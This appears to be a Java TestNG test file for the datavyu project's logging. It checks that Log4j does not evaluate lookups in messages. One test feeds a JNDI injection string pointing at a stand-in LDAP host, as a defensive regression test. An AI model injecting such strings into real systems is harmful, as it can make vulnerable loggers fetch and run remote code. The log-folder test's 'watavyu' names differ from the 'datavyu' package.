package org.datavyu.util;

import static org.testng.Assert.assertEquals;
import static org.testng.Assert.assertTrue;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.appender.AbstractAppender;
import org.apache.logging.log4j.core.config.Property;
import org.apache.logging.log4j.core.layout.PatternLayout;
import org.testng.annotations.Test;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;

/** The log keeps what it is given as text and is written where the tests say. */
public class LoggingTest {

    /** Collects the formatted lines it is given. */
    private static final class Lines extends AbstractAppender {

        private final List<String> lines = new ArrayList<>();

        Lines() {
            super("lines", null, PatternLayout.newBuilder().withPattern("%m").build(), true, Property.EMPTY_ARRAY);
        }

        @Override
        public void append(final LogEvent event) {
            lines.add(getLayout().toSerializable(event).toString());
        }
    }

    /** S2: a lookup in a message, such as one in a file path, is not evaluated. */
    @Test
    public void lookupsInMessagesStayText() {
        LoggerContext context = (LoggerContext) LogManager.getContext(false);
        Lines appender = new Lines();
        appender.start();
        context.getConfiguration().getRootLogger().addAppender(appender, null, null);
        context.updateLoggers();
        try {
            Logger logger = LogManager.getLogger(LoggingTest.class);

            logger.info("Opening /Users/someone/${java:version}/${jndi:ldap://example.invalid/x}.mp4");
            logger.info("Opening {}", "${java:version}");

            assertEquals(appender.lines, List.of(
                "Opening /Users/someone/${java:version}/${jndi:ldap://example.invalid/x}.mp4",
                "Opening ${java:version}"));
        } finally {
            context.getConfiguration().getRootLogger().removeAppender("lines");
            context.updateLoggers();
        }
    }

    @Test
    public void theLogIsWrittenToTheLogFolder() throws Exception {
        LogManager.getLogger(LoggingTest.class).info("A line for the log file");

        Path log = Paths.get(System.getProperty("watavyu.logDir"), "watavyu.log");
        assertTrue(Files.readString(log).contains("A line for the log file"));
    }
}
